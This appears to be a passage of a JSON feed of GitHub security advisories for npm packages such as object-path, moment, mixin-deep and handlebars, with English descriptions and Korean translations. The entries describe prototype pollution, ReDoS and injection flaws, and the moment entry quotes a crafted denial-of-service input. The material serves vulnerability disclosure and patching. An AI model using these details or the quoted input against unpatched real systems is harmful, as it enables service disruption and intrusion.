    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.4.6",
    "identifier": "6.4.6",
    "descriptionKR": "Mongoose는 비동기 환경에서 작동하도록 설계된 MongoDB 개체 모델링 도구입니다.\\n\\n이 패키지의 영향을 받는 버전은 Prototype Pollution에 취약합니다. `Schema.path()` 함수는 스키마 객체를 설정할 때 프로토타입 오염에 취약합니다. 이 취약점은 개체 프로토타입의 수정을 허용하고 서비스 거부(DoS) 공격으로 조작될 수 있습니다."
  },
  {
    "description": "object-path is vulnerable to Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). The `del()` function fails to validate which Object properties it deletes. This allows attackers to modify the prototype of Object, causing the modification of default properties like `toString` on all objects.",
    "identifiers": "GHSA : GHSA-8v63-cqqc-6r2c\nCVE : CVE-2021-3805",
    "severity": "HIGH",
    "updatedAt": "2023-03-21T20:27:46Z",
    "publishedAt": "2021-09-20T20:46:43Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-3805\nhttps://huntr.dev/bounties/571e3baf-7c46-46e3-9003-ba7e4e623053\nhttps://github.com/mariocasciaro/object-path/commit/4f0903fd7c832d12ccbe0d9c3d7e25d985e9e884\nhttps://github.com/mariocasciaro/object-path/commit/e6bb638ffdd431176701b3e9024f80050d0ef0a6\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00031.html\nhttps://github.com/advisories/GHSA-8v63-cqqc-6r2c",
    "name": "object-path",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.11.8",
    "identifier": "0.11.8",
    "descriptionKR": "object-path는 개체 프로토타입 속성의 부적절하게 제어된 수정('프로토타입 오염')에 취약합니다. `del()` 함수는 삭제하는 개체 속성의 유효성을 검사하지 못합니다. 이를 통해 공격자는 Object의 프로토타입을 수정하여 모든 객체에서 `toString`과 같은 기본 속성을 수정할 수 있습니다."
  },
  {
    "description": "Versions of `fstream` prior to 1.0.12 are vulnerable to Arbitrary File Overwrite. Extracting tarballs containing a hardlink to a file that already exists in the system and a file that matches the hardlink will overwrite the system's file with the contents of the extracted file. The `fstream.DirWriter()` function is vulnerable.\n\n\n## Recommendation\n\nUpgrade to version 1.0.12 or later.",
    "identifiers": "GHSA : GHSA-xf7w-r453-m56c\nCVE : CVE-2019-13173",
    "severity": "HIGH",
    "updatedAt": "2023-03-21T20:12:27Z",
    "publishedAt": "2019-05-30T17:19:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-13173\nhttps://github.com/npm/fstream/commit/6a77d2fa6e1462693cf8e46f930da96ec1b0bb22\nhttps://usn.ubuntu.com/4123-1/\nhttps://www.npmjs.com/advisories/886\nhttp://lists.opensuse.org/opensuse-security-announce/2019-08/msg00010.html\nhttp://lists.opensuse.org/opensuse-security-announce/2019-08/msg00052.html\nhttps://github.com/advisories/GHSA-xf7w-r453-m56c",
    "name": "fstream",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.0.12",
    "identifier": "1.0.12",
    "descriptionKR": "1.0.12 이전의 `fstream` 버전은 임의 파일 덮어쓰기에 취약합니다. 시스템에 이미 존재하는 파일 및 하드 링크와 일치하는 파일에 대한 하드 링크가 포함된 tarball을 추출하면 추출된 파일의 내용으로 시스템 파일을 덮어씁니다. `fstream.DirWriter()` 함수는 취약합니다.\n\n\n## 추천\n\n버전 1.0.12 이상으로 업그레이드하십시오."
  },
  {
    "description": "shelljs is vulnerable to Improper Privilege Management",
    "identifiers": "GHSA : GHSA-4rq4-32rv-6wp6\nCVE : CVE-2022-0144",
    "severity": "HIGH",
    "updatedAt": "2023-03-21T20:10:17Z",
    "publishedAt": "2022-01-21T23:37:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-0144\nhttps://github.com/shelljs/shelljs/commit/d919d22dd6de385edaa9d90313075a77f74b338c\nhttps://huntr.dev/bounties/50996581-c08e-4eed-a90e-c0bac082679c\nhttps://github.com/advisories/GHSA-4rq4-32rv-6wp6",
    "name": "shelljs",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.8.5",
    "identifier": "0.8.5",
    "descriptionKR": "shelljs는 부적절한 권한 관리에 취약합니다."
  },
  {
    "description": "The package css-what before 2.1.3 is vulnerable to Regular Expression Denial of Service (ReDoS) due to the use of insecure regular expression in the `re_attr` variable of index.js. The exploitation of this vulnerability could be triggered via the parse function.",
    "identifiers": "GHSA : GHSA-p28h-cc7q-c4fg\nCVE : CVE-2022-21222",
    "severity": "HIGH",
    "updatedAt": "2023-08-08T21:17:38Z",
    "publishedAt": "2022-10-01T00:00:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-21222\nhttps://security.snyk.io/vuln/SNYK-JS-CSSWHAT-3035488\nhttps://github.com/fb55/css-what/commit/dc510929790da6617e7aa93a616498b22f6a6b72\nhttps://github.com/fb55/css-what/blob/a38effd5a8f5506d75c7f8f13cbd8c76248a3860/index.js#23L12\nhttps://github.com/fb55/css-what/blob/a38effd5a8f5506d75c7f8f13cbd8c76248a3860/index.js%23L12\nhttps://lists.debian.org/debian-lts-announce/2023/03/msg00001.html\nhttps://github.com/advisories/GHSA-p28h-cc7q-c4fg",
    "name": "css-what",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.1.3",
    "identifier": "2.1.3",
    "descriptionKR": "2.1.3 이전 패키지 css-what은 index.js의 're_attr' 변수에서 안전하지 않은 정규식을 사용하기 때문에 정규식 서비스 거부(ReDoS)에 취약합니다. 이 취약점의 악용은 구문 분석 기능을 통해 트리거될 수 있습니다."
  },
  {
    "description": "feathers-sequelize is vulnerable to improper parameter filtering in the Feathers js library, which may ultimately lead to SQL injection.",
    "identifiers": "GHSA : GHSA-5hq7-j5wq-p227\nCVE : CVE-2022-29822",
    "severity": "CRITICAL",
    "updatedAt": "2023-07-28T18:14:50Z",
    "publishedAt": "2022-10-26T12:00:28Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-29822\nhttps://csirt.divd.nl/cases/DIVD-2022-00020\nhttps://csirt.divd.nl/cves/CVE-2022-29822/\nhttps://github.com/feathersjs-ecosystem/feathers-sequelize/commit/0f2d85f0b2d556f2b6c70423dcebdbd29d95e3dc\nhttps://csirt.divd.nl/CVE-2022-29822/\nhttps://csirt.divd.nl/DIVD-2022-00020\nhttps://github.com/advisories/GHSA-5hq7-j5wq-p227",
    "name": "feathers-sequelize",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.3.4",
    "identifier": "6.3.4",
    "descriptionKR": "feathers-sequelize는 Feathers js 라이브러리의 부적절한 매개변수 필터링에 취약하여 궁극적으로 SQL 주입으로 이어질 수 있습니다."
  },
  {
    "description": "### Impact\nA prototype pollution vulnerability has been found in `object-path` <= 0.11.4 affecting the `set()` method. The vulnerability is limited to the `includeInheritedProps` mode (if version >= 0.11.0 is used), which has to be explicitly enabled by creating a new instance of `object-path` and setting the option `includeInheritedProps: true`, or by using the default `withInheritedProps` instance. The default operating mode is not affected by the vulnerability if version >= 0.11.0 is used. Any usage of `set()` in versions < 0.11.0 is vulnerable.\n \n### Patches\nUpgrade to version >= 0.11.5\n\n### Workarounds\nDon't use the `includeInheritedProps: true` options or the `withInheritedProps` instance if using a version >= 0.11.0.\n\n### References\n[Read more about the prototype pollution vulnerability](https://codeburst.io/what-is-prototype-pollution-49482fc4b638)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [object-path](https://github.com/mariocasciaro/object-path)",
    "identifiers": "GHSA : GHSA-cwx2-736x-mf6w\nCVE : CVE-2020-15256",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T23:45:02Z",
    "publishedAt": "2020-10-19T20:55:55Z",
    "references": "https://github.com/mariocasciaro/object-path/security/advisories/GHSA-cwx2-736x-mf6w\nhttps://github.com/mariocasciaro/object-path/commit/2be3354c6c46215c7635eb1b76d80f1319403c68\nhttps://nvd.nist.gov/vuln/detail/CVE-2020-15256\nhttps://github.com/advisories/GHSA-cwx2-736x-mf6w",
    "name": "object-path",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.11.5",
    "identifier": "0.11.5",
    "descriptionKR": "### 영향\n`set()` 메서드에 영향을 미치는 `object-path` <= 0.11.4에서 프로토타입 오염 취약점이 발견되었습니다. 취약점은 `includeInheritedProps` 모드(버전 >= 0.11.0이 사용되는 경우)로 제한되며 `object-path`의 새 인스턴스를 생성하고 `includeInheritedProps: true` 옵션을 설정하여 명시적으로 활성화해야 합니다. 또는 기본 `withInheritedProps` 인스턴스를 사용하여. 기본 작동 모드는 버전 >= 0.11.0이 사용되는 경우 취약점의 영향을 받지 않습니다. 0.11.0 미만 버전에서 `set()`을 사용하면 취약합니다.\n \n### 패치\n버전 >= 0.11.5로 업그레이드\n\n### 해결 방법\n버전 >= 0.11.0을 사용하는 경우 `includeInheritedProps: true` 옵션이나 `withInheritedProps` 인스턴스를 사용하지 마십시오.\n\n### 참조\n[프로토타입 오염 취약성에 대해 자세히 알아보기](https://codeburst.io/what-is-prototype-pollution-49482fc4b638)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [object-path](https://github.com/mariocasciaro/object-path)에서 이슈 열기"
  },
  {
    "description": "Hawk is an HTTP authentication scheme providing mechanisms for making authenticated HTTP requests with partial cryptographic verification of the request and response, covering the HTTP method, request URI, host, and optionally the request payload. Hawk used a regular expression to parse `Host` HTTP header (`Hawk.utils.parseHost()`), which was subject to regular expression DoS attack - meaning each added character in the attacker's input increases the computation time exponentially. `parseHost()` was patched in `9.0.1` to use built-in `URL` class to parse hostname instead.`Hawk.authenticate()` accepts `options` argument. If that contains `host` and `port`, those would be used instead of a call to `utils.parseHost()`.",
    "identifiers": "GHSA : GHSA-44pw-h2cw-w3vq\nCVE : CVE-2022-29167",
    "severity": "HIGH",
    "updatedAt": "2023-07-21T19:28:40Z",
    "publishedAt": "2022-05-23T20:18:14Z",
    "references": "https://github.com/mozilla/hawk/security/advisories/GHSA-44pw-h2cw-w3vq\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-29167\nhttps://github.com/mozilla/hawk/pull/286\nhttps://github.com/mozilla/hawk/commit/d10d72ca82db967f6c5fcf866ff78e3ca25ce1ab\nhttps://github.com/advisories/GHSA-44pw-h2cw-w3vq",
    "name": "hawk",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 9.0.1",
    "identifier": "9.0.1",
    "descriptionKR": "Hawk는 HTTP 메서드, 요청 URI, 호스트 및 선택적으로 요청 페이로드를 포함하는 요청 및 응답의 부분 암호화 검증으로 인증된 HTTP 요청을 만들기 위한 메커니즘을 제공하는 HTTP 인증 체계입니다. Hawk는 'Host' HTTP 헤더('Hawk.utils.parseHost()')를 구문 분석하기 위해 정규식을 사용했는데, 이는 정규식 DoS 공격의 대상이었습니다. `9.0.1`에서는 `9.0.1`에서 `parseHost()`가 패치되어 내장된 `URL` 클래스를 사용하여 대신 호스트 이름을 구문 분석합니다.`Hawk.authenticate()`는 `options` 인수를 허용합니다. 여기에 `host` 및 `port`가 포함되어 있으면 `utils.parseHost()`에 대한 호출 대신 사용됩니다."
  },
  {
    "description": "### Impact\n\n* using string-to-date parsing in moment (more specifically rfc2822 parsing, which is tried by default) has quadratic (N^2) complexity on specific inputs\n* noticeable slowdown is observed with inputs above 10k characters\n* users who pass user-provided strings without sanity length checks to moment constructor are vulnerable to (Re)DoS attacks\n\n### Patches\nThe problem is patched in 2.29.4, the patch can be applied to all affected versions with minimal tweaking.\n\n### Workarounds\nIn general, given the proliferation of ReDoS attacks, it makes sense to limit the length of the user input to something sane, like 200 characters or less. I haven't seen legitimate cases of date-time strings longer than that, so all moment users who do pass a user-originating string to constructor are encouraged to apply such a rudimentary filter, that would help with this but also most future ReDoS vulnerabilities.\n\n### References\nThere is an excellent writeup of the issue here: https://github.com/moment/moment/pull/6015#issuecomment-1152961973=\n\n### Details\nThe issue is rooted in the code that removes legacy comments (stuff inside parenthesis) from strings during rfc2822 parsing. `moment(\"(\".repeat(500000))` will take a few minutes to process, which is unacceptable.",
    "identifiers": "GHSA : GHSA-wc69-rhjr-hc9g\nCVE : CVE-2022-31129",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T23:29:32Z",
    "publishedAt": "2022-07-06T18:38:49Z",
    "references": "https://github.com/moment/moment/security/advisories/GHSA-wc69-rhjr-hc9g\nhttps://github.com/moment/moment/pull/6015#issuecomment-1152961973\nhttps://github.com/moment/moment/commit/9a3b5894f3d5d602948ac8a02e4ee528a49ca3a3\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-31129\nhttps://huntr.dev/bounties/f0952b67-f2ff-44a9-a9cd-99e0a87cb633/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6QIO6YNLTK2T7SPKDS4JEL45FANLNC2Q/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ORJX2LF6KMPIHP6B2P6KZIVKMLE3LVJ5/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/IWY24RJA3SBJGA5N4CU4VBPHJPPPJL5O/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZMX5YHELQVCGKKQVFXIYOTBMN23YYSRO/\nhttps://security.netapp.com/advisory/ntap-20221014-0003/\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00035.html\nhttps://github.com/moment/moment/pull/6015/commits/4bbb9f3ccbe231de40207503f344fe5ce97584f4\nhttps://github.com/moment/moment/pull/6015/commits/bfd4f2375d5c1a2106246721d693a9611dddfbfe\nhttps://github.com/moment/moment/pull/6015/commits/dc0d180e90d8a84f7ff13572363330a22b3ea504\nhttps://github.com/advisories/GHSA-wc69-rhjr-hc9g",
    "name": "moment",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.18.0, < 2.29.4",
    "identifier": "2.29.4",
    "descriptionKR": "### 영향\n\n* 현재까지 문자열 구문 분석을 사용하는 경우(더 구체적으로는 기본적으로 시도되는 rfc2822 구문 분석) 특정 입력에 대해 2차(N^2) 복잡도가 있습니다.\n* 10,000자를 초과하는 입력에서 눈에 띄는 속도 저하가 관찰됨\n* 온전한 길이 검사 없이 사용자가 제공한 문자열을 모멘트 생성자에게 전달하는 사용자는 (Re)DoS 공격에 취약합니다.\n\n### 패치\n문제는 2.29.4에서 패치되었으며 패치는 최소한의 조정으로 영향을 받는 모든 버전에 적용될 수 있습니다.\n\n### 해결 방법\n일반적으로 ReDoS 공격의 확산을 감안할 때 사용자 입력 길이를 200자 이하와 같이 정상적인 것으로 제한하는 것이 좋습니다. 그보다 긴 날짜-시간 문자열의 합법적인 경우를 본 적이 없으므로 사용자 시작 문자열을 생성자에 전달하는 모든 순간 사용자는 이와 같은 초보적인 필터를 적용하는 것이 좋습니다. 이는 이것뿐만 아니라 대부분의 향후 ReDoS 취약점에도 도움이 될 것입니다. .\n\n### 참조\n여기에 문제에 대한 훌륭한 글이 있습니다: https://github.com/moment/moment/pull/6015#issuecomment-1152961973=\n\n### 세부 정보\n이 문제는 rfc2822 구문 분석 중에 문자열에서 레거시 주석(괄호 안의 항목)을 제거하는 코드에 뿌리를 두고 있습니다. `moment(\"(\".repeat(500000))`는 처리하는 데 몇 분 정도 걸리며 이는 허용되지 않습니다."
  },
  {
    "description": "The xmlhttprequest-ssl package before 1.6.1 for Node.js disables SSL certificate validation by default, because rejectUnauthorized (when the property exists but is undefined) is considered to be false within the https.request function of Node.js. In other words, no certificate is ever rejected.",
    "identifiers": "GHSA : GHSA-72mh-269x-7mh5\nCVE : CVE-2021-31597",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T23:18:13Z",
    "publishedAt": "2021-05-24T19:52:55Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-31597\nhttps://github.com/mjwwit/node-XMLHttpRequest/commit/bf53329b61ca6afc5d28f6b8d2dc2e3ca740a9b2\nhttps://github.com/mjwwit/node-XMLHttpRequest/compare/v1.6.0...1.6.1\nhttps://people.kingsds.network/wesgarland/xmlhttprequest-ssl-vuln.txt\nhttps://security.netapp.com/advisory/ntap-20210618-0004/\nhttps://github.com/advisories/GHSA-72mh-269x-7mh5",
    "name": "xmlhttprequest-ssl",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.1",
    "identifier": "1.6.1",
    "descriptionKR": "Node.js용 1.6.1 이전의 xmlhttprequest-ssl 패키지는 기본적으로 SSL 인증서 유효성 검사를 비활성화합니다. 이는 rejectUnauthorized(속성이 존재하지만 정의되지 않은 경우)가 Node.js의 https.request 함수 내에서 false로 간주되기 때문입니다. 즉, 어떤 인증서도 거부되지 않습니다."
  },
  {
    "description": "This affects the package xmlhttprequest before 1.7.0; all versions of package xmlhttprequest-ssl. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.",
    "identifiers": "GHSA : GHSA-h4j5-c7cj-74xg\nCVE : CVE-2020-28502",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T23:17:11Z",
    "publishedAt": "2021-05-04T18:02:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28502\nhttps://github.com/driverdan/node-XMLHttpRequest/commit/983cfc244c7567ad6a59e366e55a8037e0497fe6\nhttps://github.com/driverdan/node-XMLHttpRequest/blob/1.6.0/lib/XMLHttpRequest.js#L480\nhttps://github.com/driverdan/node-XMLHttpRequest/blob/1.6.0/lib/XMLHttpRequest.js%23L480\nhttps://github.com/mjwwit/node-XMLHttpRequest/blob/ae38832a0f1347c5e96dda665402509a3458e302/lib/XMLHttpRequest.js#L531\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1082937\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1082938\nhttps://snyk.io/vuln/SNYK-JS-XMLHTTPREQUEST-1082935\nhttps://snyk.io/vuln/SNYK-JS-XMLHTTPREQUESTSSL-1082936\nhttps://github.com/mjwwit/node-XMLHttpRequest/commit/ee1e81fc67729c7c0eba5537ed7fe1e30a6b3291\nhttps://github.com/advisories/GHSA-h4j5-c7cj-74xg",
    "name": "xmlhttprequest-ssl",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.6.2",
    "identifier": "1.6.2",
    "descriptionKR": "이것은 1.7.0 이전의 패키지 xmlhttprequest에 영향을 미칩니다. 패키지 xmlhttprequest-ssl의 모든 버전. 제공된 요청은 동기식으로 전송되며(xhr.open에서 async=False), xhr.send로 유입되는 악의적인 사용자 입력으로 인해 임의 코드가 삽입되어 실행될 수 있습니다."
  },
  {
    "description": "This affects the package xmlhttprequest before 1.7.0; all versions of package xmlhttprequest-ssl. Provided requests are sent synchronously (async=False on xhr.open), malicious user input flowing into xhr.send could result in arbitrary code being injected and run.",
    "identifiers": "GHSA : GHSA-h4j5-c7cj-74xg\nCVE : CVE-2020-28502",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T23:17:11Z",
    "publishedAt": "2021-05-04T18:02:34Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-28502\nhttps://github.com/driverdan/node-XMLHttpRequest/commit/983cfc244c7567ad6a59e366e55a8037e0497fe6\nhttps://github.com/driverdan/node-XMLHttpRequest/blob/1.6.0/lib/XMLHttpRequest.js#L480\nhttps://github.com/driverdan/node-XMLHttpRequest/blob/1.6.0/lib/XMLHttpRequest.js%23L480\nhttps://github.com/mjwwit/node-XMLHttpRequest/blob/ae38832a0f1347c5e96dda665402509a3458e302/lib/XMLHttpRequest.js#L531\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1082937\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1082938\nhttps://snyk.io/vuln/SNYK-JS-XMLHTTPREQUEST-1082935\nhttps://snyk.io/vuln/SNYK-JS-XMLHTTPREQUESTSSL-1082936\nhttps://github.com/mjwwit/node-XMLHttpRequest/commit/ee1e81fc67729c7c0eba5537ed7fe1e30a6b3291\nhttps://github.com/advisories/GHSA-h4j5-c7cj-74xg",
    "name": "xmlhttprequest",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.7.0",
    "identifier": "1.7.0",
    "descriptionKR": "이것은 1.7.0 이전의 패키지 xmlhttprequest에 영향을 미칩니다. 패키지 xmlhttprequest-ssl의 모든 버전. 제공된 요청은 동기식으로 전송되며(xhr.open에서 async=False), xhr.send로 유입되는 악의적인 사용자 입력으로 인해 임의 코드가 삽입되어 실행될 수 있습니다."
  },
  {
    "description": "All versions of the package `scss-tokenizer` prior to 0.4.3 are vulnerable to Regular Expression Denial of Service (ReDoS) via the `loadAnnotation()` function, due to the usage of insecure regex.",
    "identifiers": "GHSA : GHSA-7mwh-4pqv-wmr8\nCVE : CVE-2022-25758",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T22:43:58Z",
    "publishedAt": "2022-07-02T00:00:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25758\nhttps://github.com/sasstools/scss-tokenizer/issues/45\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-2936782\nhttps://snyk.io/vuln/SNYK-JS-SCSSTOKENIZER-2339884\nhttps://github.com/sasstools/scss-tokenizer/pull/49\nhttps://github.com/sasstools/scss-tokenizer/commit/a53b6f233e648cc01acbdd89c58786cf8ba56e35\nhttps://github.com/advisories/GHSA-7mwh-4pqv-wmr8",
    "name": "scss-tokenizer",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.4.2",
    "identifier": "0.4.3",
    "descriptionKR": "패키지 `scss-tokenizer` 0.4.3 이전 버전의 모든 버전은 안전하지 않은 정규식 사용으로 인해 `loadAnnotation()` 함수를 통한 정규식 서비스 거부(ReDoS)에 취약합니다."
  },
  {
    "description": "### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https://github.com/moment/moment)\n",
    "identifiers": "GHSA : GHSA-8hfj-j24r-96c4\nCVE : CVE-2022-24785",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T22:35:12Z",
    "publishedAt": "2022-04-04T21:25:48Z",
    "references": "https://github.com/moment/moment/security/advisories/GHSA-8hfj-j24r-96c4\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-24785\nhttps://github.com/moment/moment/commit/4211bfc8f15746be4019bba557e29a7ba83d54c5\nhttps://www.tenable.com/security/tns-2022-09\nhttps://security.netapp.com/advisory/ntap-20220513-0006/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6QIO6YNLTK2T7SPKDS4JEL45FANLNC2Q/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ORJX2LF6KMPIHP6B2P6KZIVKMLE3LVJ5/\nhttps://lists.debian.org/debian-lts-announce/2023/01/msg00035.html\nhttps://github.com/advisories/GHSA-8hfj-j24r-96c4",
    "name": "moment",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.29.2",
    "identifier": "2.29.2",
    "descriptionKR": "### 영향\n이 취약점은 moment.js의 npm(서버) 사용자에게 영향을 미치며, 특히 사용자가 로케일 문자열을 제공한 경우(예: 'fr'은 모멘트 로케일을 전환하는 데 직접 사용됨)\n\n### 패치\n이 문제는 2.29.2에서 패치되었으며 패치는 영향을 받는 모든 버전(1.0.1에서 2.29.1까지 포함)에 적용될 수 있습니다.\n\n### 해결 방법\nmoment.js에 전달하기 전에 사용자가 제공한 로케일 이름을 삭제합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [moment repo](https://github.com/moment/moment)에서 이슈 열기"
  },
  {
    "description": "Versions of `mixin-deep` prior to 2.0.1 or 1.3.2 are vulnerable to Prototype Pollution. The `mixinDeep` function fails to validate which Object properties it updates. This allows attackers to modify the prototype of Object, causing the addition or modification of an existing property on all objects.\n\n\n\n\n## Recommendation\n\nIf you are using `mixin-deep` 2.x, upgrade to version 2.0.1 or later.\nIf you are using `mixin-deep` 1.x, upgrade to version 1.3.2 or later.",
    "identifiers": "GHSA : GHSA-fhjf-83wg-r2j9\nCVE : CVE-2019-10746",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T22:23:52Z",
    "publishedAt": "2019-08-27T17:42:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10746\nhttps://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BFNIVG2XYFPZJY3DYYBJASZ7ZMKBMIJT/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UXRA365KZCUNXMU3KDH5JN5BEPNIGUKC/\nhttps://www.npmjs.com/advisories/1013\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9\nhttps://github.com/jonschlinkert/mixin-deep/commit/90ee1fab375fccfd9b926df718243339b4976d50\nhttps://github.com/advisories/GHSA-fhjf-83wg-r2j9",
    "name": "mixin-deep",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 2.0.0",
    "identifier": "2.0.1",
    "descriptionKR": "2.0.1 또는 1.3.2 이전의 `mixin-deep` 버전은 Prototype Pollution에 취약합니다. `mixinDeep` 함수는 업데이트하는 개체 속성의 유효성을 검사하지 못합니다. 이를 통해 공격자는 개체의 프로토타입을 수정하여 모든 개체의 기존 속성을 추가하거나 수정할 수 있습니다.\n\n\n\n\n## 추천\n\n`mixin-deep` 2.x를 사용하는 경우 버전 2.0.1 이상으로 업그레이드하십시오.\n`mixin-deep` 1.x를 사용하는 경우 버전 1.3.2 이상으로 업그레이드하십시오."
  },
  {
    "description": "Versions of `mixin-deep` prior to 2.0.1 or 1.3.2 are vulnerable to Prototype Pollution. The `mixinDeep` function fails to validate which Object properties it updates. This allows attackers to modify the prototype of Object, causing the addition or modification of an existing property on all objects.\n\n\n\n\n## Recommendation\n\nIf you are using `mixin-deep` 2.x, upgrade to version 2.0.1 or later.\nIf you are using `mixin-deep` 1.x, upgrade to version 1.3.2 or later.",
    "identifiers": "GHSA : GHSA-fhjf-83wg-r2j9\nCVE : CVE-2019-10746",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-20T22:23:52Z",
    "publishedAt": "2019-08-27T17:42:33Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-10746\nhttps://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BFNIVG2XYFPZJY3DYYBJASZ7ZMKBMIJT/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UXRA365KZCUNXMU3KDH5JN5BEPNIGUKC/\nhttps://www.npmjs.com/advisories/1013\nhttps://www.oracle.com//security-alerts/cpujul2021.html\nhttps://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9\nhttps://github.com/jonschlinkert/mixin-deep/commit/90ee1fab375fccfd9b926df718243339b4976d50\nhttps://github.com/advisories/GHSA-fhjf-83wg-r2j9",
    "name": "mixin-deep",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.2",
    "identifier": "1.3.2",
    "descriptionKR": "2.0.1 또는 1.3.2 이전의 `mixin-deep` 버전은 Prototype Pollution에 취약합니다. `mixinDeep` 함수는 업데이트하는 개체 속성의 유효성을 검사하지 못합니다. 이를 통해 공격자는 개체의 프로토타입을 수정하여 모든 개체의 기존 속성을 추가하거나 수정할 수 있습니다.\n\n\n\n\n## 추천\n\n`mixin-deep` 2.x를 사용하는 경우 버전 2.0.1 이상으로 업그레이드하십시오.\n`mixin-deep` 1.x를 사용하는 경우 버전 1.3.2 이상으로 업그레이드하십시오."
  },
  {
    "description": "Handlebars before 4.4.5 allows Regular Expression Denial of Service (ReDoS) because of eager matching. The parser may be forced into an endless loop while processing crafted templates. This may allow attackers to exhaust system resources.",
    "identifiers": "GHSA : GHSA-62gr-4qp9-h98f\nCVE : CVE-2019-20922",
    "severity": "HIGH",
    "updatedAt": "2023-03-20T22:21:58Z",
    "publishedAt": "2022-02-10T20:38:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2019-20922\nhttps://github.com/handlebars-lang/handlebars.js/commit/8d5530ee2c3ea9f0aee3fde310b9f36887d00b8b\nhttps://snyk.io/vuln/SNYK-JS-HANDLEBARS-480388\nhttps://www.npmjs.com/advisories/1300\nhttps://www.npmjs.com/package/handlebars\nhttps://github.com/advisories/GHSA-62gr-4qp9-h98f",
    "name": "handlebars",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.4.5",
    "identifier": "4.4.5",
    "descriptionKR": "4.4.5 이전의 핸들바는 적극적인 일치로 인해 정규식 서비스 거부(ReDoS)를 허용합니다. 파서는 제작된 템플릿을 처리하는 동안 무한 루프에 빠질 수 있습니다. 이로 인해 공격자가 시스템 리소스를 소진할 수 있습니다."
  },
  {
